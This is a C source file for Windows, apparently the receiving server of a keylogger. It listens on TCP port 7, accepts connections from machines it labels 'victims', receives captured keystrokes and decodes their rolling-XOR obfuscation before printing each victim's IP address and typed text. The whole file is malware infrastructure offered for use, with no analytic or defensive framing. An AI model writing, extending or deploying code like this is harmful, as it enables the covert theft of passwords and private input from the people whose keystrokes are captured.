#include "KeystrokeServer.h"

void main(int argc, char *argv[]) {
	INT serverSocket;
	INT victimSocket;
	struct sockaddr_in keystrokeServerAddr;
	struct sockaddr_in victimAddr;
	USHORT keystrokeServerPort = 7;
	UINT clntLen;
	WSADATA wsaData;

	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
		fprintf(stderr, "WSAStartup() failed");
		exit(1);
	}

	if ((serverSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		fprintf(stderr, "socket() failed: %d\n", WSAGetLastError());
		exit(1);
	}

	memset(&keystrokeServerAddr, 0, sizeof(keystrokeServerAddr));
	keystrokeServerAddr.sin_family = AF_INET;
	keystrokeServerAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	keystrokeServerAddr.sin_port = htons(keystrokeServerPort);

	if (bind(serverSocket, (struct sockaddr *) &keystrokeServerAddr, sizeof(keystrokeServerAddr)) < 0) {
		fprintf(stderr, "bind() failed: %d\n", WSAGetLastError());
		exit(1);
	}

	if (listen(serverSocket, MAXPENDING) < 0) {
		fprintf(stderr, "listen() failed: %d\n",  WSAGetLastError());
		exit(1);
	}

	while (TRUE) {
		clntLen = sizeof(victimAddr);

		if ((victimSocket = accept(serverSocket, (struct sockaddr *) &victimAddr, &clntLen)) < 0) {
			printf("accept() failed");
		}

		CHAR keystrokeBuffer[BUFFER_SIZE + 1];
		INT recvMsgSize; 

		if ((recvMsgSize = recv(victimSocket, keystrokeBuffer, BUFFER_SIZE, 0)) < 0) {
			printf("recv() failed\n");
		}

		keystrokeBuffer[recvMsgSize] = NULL;
		printf("Victim [%s] Got [%d] characters [", inet_ntoa(victimAddr.sin_addr), recvMsgSize);


		UCHAR mask = 0x65;
		for (int i = 0; i < recvMsgSize; i++) {
			UCHAR keystroke = (keystrokeBuffer[i] - 1) ^ mask;
			printf("%c", keystroke);
			mask = keystroke ^ (i + 1);
		}
		printf("]\n");

		closesocket(victimSocket);
	}
}

